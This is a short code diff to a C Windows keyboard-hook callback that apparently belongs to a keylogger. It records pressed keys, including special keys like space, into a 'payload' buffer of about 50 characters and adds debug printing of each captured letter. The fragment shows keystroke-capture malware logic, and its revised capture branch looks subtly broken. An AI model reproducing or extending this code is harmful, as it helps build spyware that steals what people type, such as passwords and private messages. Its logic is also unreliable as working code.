@@ -27,9 +27,9 @@ LRESULT CALLBACK stuff(int nCode, WPARAM wParam, LPARAM lParam)
 
 		//make sure to check that payload doesnt exceed ~50 chars(thats about a sentence)
 
-		if(letter != 0){
-			charAppend[0] = (char)letter;
-		}else{
+
+
+
 			switch(virtualKey)
 			{
 				
@@ -48,9 +48,17 @@ LRESULT CALLBACK stuff(int nCode, WPARAM wParam, LPARAM lParam)
 				case VK_SPACE:
 					strcpy(charAppend, "<SPACE>");
 					break;
+				default:
+					if(charAppend[0] != 0){
+						charAppend[0] = (char)letter;
+					}
 			}
-		}
 		
+
+
+		printf("Letter:\t%s\t", charAppend);
+		printf("Code:\t%u\t\n\n", letter);
+
 		size_t payloadSize = strlen(payload);
 		
 		if(payloadSize > 48){
@@ -76,7 +84,7 @@ LRESULT CALLBACK stuff(int nCode, WPARAM wParam, LPARAM lParam)
 		}
 		else
 		{
-			printf("Letter(special):\t%s\t", specialLetter);
+
 		}
 		*/
 
